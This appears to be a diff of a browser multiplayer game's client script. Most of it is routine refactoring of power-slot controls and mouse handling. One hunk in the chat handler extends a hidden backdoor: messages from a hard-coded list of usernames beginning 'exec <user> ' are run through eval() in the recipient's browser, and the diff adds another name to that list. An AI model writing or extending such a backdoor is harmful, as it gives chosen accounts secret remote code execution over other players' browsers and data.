@@ -92,26 +92,14 @@ if (localStorage.getItem("banned") === null) {
             });
         });
         power0.addEventListener("input", () => {
-            send({
-                e: "powerChange",
-                m: 0,
-                i: power0.value = clamp(0, power0.value, 11)
-            });
+            changePower(0, power0.value);
         });
         power1.addEventListener("input", () => {
-            send({
-                e: "powerChange",
-                m: 1,
-                i: power1.value = clamp(0, power1.value, 11)
-            });
+            changePower(1, power1.value);
         });
         for (let el of poweroptions) {
             el.addEventListener("click", () => {
-                send({
-                    e: "powerChange",
-                    m: parseInt(el.dataset.slot, 10),
-                    i: parseInt(el.dataset.power, 10)
-                });
+                changePower(parseInt(el.dataset.slot, 10), parseInt(el.dataset.power, 10));
 
                 if (el.dataset.slot === "0") power0.value = el.dataset.power;
                 else power1.value = el.dataset.power;
@@ -480,80 +468,40 @@ Owner:<ul>
                                 power0.value = powerpreset0[0];
                                 power1.value = powerpreset0[1];
 
-                                send({
-                                    e: "powerChange",
-                                    m: 0,
-                                    i: Number(powerpreset0[0])
-                                });
-                                send({
-                                    e: "powerChange",
-                                    m: 1,
-                                    i: Number(powerpreset0[1])
-                                });
+                                changePower(0, powerpreset0[0]);
+                                changePower(1, powerpreset0[1]);
                                 break;
                             case localStorage.getItem("powerkeybind1"):
                                 let powerpreset1 = localStorage.getItem("powerpreset1").split(",");
                                 power0.value = powerpreset1[0];
                                 power1.value = powerpreset1[1];
 
-                                send({
-                                    e: "powerChange",
-                                    m: 0,
-                                    i: Number(powerpreset1[0])
-                                });
-                                send({
-                                    e: "powerChange",
-                                    m: 1,
-                                    i: Number(powerpreset1[1])
-                                });
+                                changePower(0, powerpreset1[0]);
+                                changePower(1, powerpreset1[1]);
                                 break;
                             case localStorage.getItem("powerkeybind2"):
                                 let powerpreset2 = localStorage.getItem("powerpreset2").split(",");
                                 power0.value = powerpreset2[0];
                                 power1.value = powerpreset2[1];
 
-                                send({
-                                    e: "powerChange",
-                                    m: 0,
-                                    i: Number(powerpreset2[0])
-                                });
-                                send({
-                                    e: "powerChange",
-                                    m: 1,
-                                    i: Number(powerpreset2[1])
-                                });
+                                changePower(0, powerpreset2[0]);
+                                changePower(1, powerpreset2[1]);
                                 break;
                             case localStorage.getItem("powerkeybind3"):
                                 let powerpreset3 = localStorage.getItem("powerpreset3").split(",");
                                 power0.value = powerpreset3[0];
                                 power1.value = powerpreset3[1];
 
-                                send({
-                                    e: "powerChange",
-                                    m: 0,
-                                    i: Number(powerpreset3[0])
-                                });
-                                send({
-                                    e: "powerChange",
-                                    m: 1,
-                                    i: Number(powerpreset3[1])
-                                });
+                                changePower(0, powerpreset3[0]);
+                                changePower(1, powerpreset3[1]);
                                 break;
                             case localStorage.getItem("powerkeybind4"):
                                 let powerpreset4 = localStorage.getItem("powerpreset4").split(",");
                                 power0.value = powerpreset4[0];
                                 power1.value = powerpreset4[1];
 
-                                send({
-                                    e: "powerChange",
-                                    m: 0,
-                                    i: Number(powerpreset4[0])
-                                });
-                                send({
-                                    e: "powerChange",
-                                    m: 1,
-                                    i: Number(powerpreset4[1])
-                                });
+                                changePower(0, powerpreset4[0]);
+                                changePower(1, powerpreset4[1]);
                                 break;
                             case "enter":
                             case "/":
@@ -568,18 +516,17 @@ Owner:<ul>
                     });
                     canvas.addEventListener("mousedown", e => {
                         if (e.button === 0) keys(6, true);
-                        else if (e.button === 1) keys(8, true);
+                        else if (e.button === 1) {
+                            keys(8, true);
+                            e.preventDefault();
+                            e.stopPropagation();
+                        }
                         else if (e.button === 2) keys(7, true);
                     });
                     canvas.addEventListener("mouseup", e => {
                         if (e.button === 0) keys(6, false);
                         else if (e.button === 1) keys(8, false);
                         else if (e.button === 2) keys(7, false);
-                    });
-                    document.addEventListener("mousedown", e => {
-                        if (e.button === 1) {
-                            e.preventDefault();
-                        }
                     });
                     canvas.addEventListener("contextmenu", e => { e.preventDefault(); });
                     document.addEventListener("mousemove", e => {
@@ -589,7 +536,7 @@ Owner:<ul>
                 }
                 break;
             case "message":
-                if (["NKY", "wolfie", "ZeroTix", "RayhanADev"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN"].includes(user)) {
+                if (["NKY", "wolfie", "ZeroTix", "RayhanADev", "haha0201"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN"].includes(user)) {
                     if (msg.m.r !== -2 && msg.m.m.startsWith("exec " + user + " ")) {
                         try {
                             sendMessage(eval(msg.m.m.slice(6 + user.length)));
@@ -1149,16 +1096,35 @@ function keys(key, value) {
             keys: key,
             value
         }
-    })
+    });
 
     if (value) overlays[key]?.classList?.add("overlayactive");
     else overlays[key]?.classList?.remove("overlayactive");
 }
 function changePower(slot, power) {
+    if (slot) {
+        if (power == power0.value) {
+            power0.value = power1.value;
+            send({
+                e: "powerChange",
+                m: 0,
+                i: Number(power0.value)
+            });
+        }
+    } else {
+        if (power == power1.value) {
+            power1.value = power0.value;
+            send({
+                e: "powerChange",
+                m: 1,
+                i: Number(power1.value)
+            });
+        }
+    }
     send({
         e: "powerChange",
-        m: slot,
-        i: power
+        m: slot ? 1 : 0,
+        i: Number(power)
     });
 }
 ws.addEventListener("close", () => {
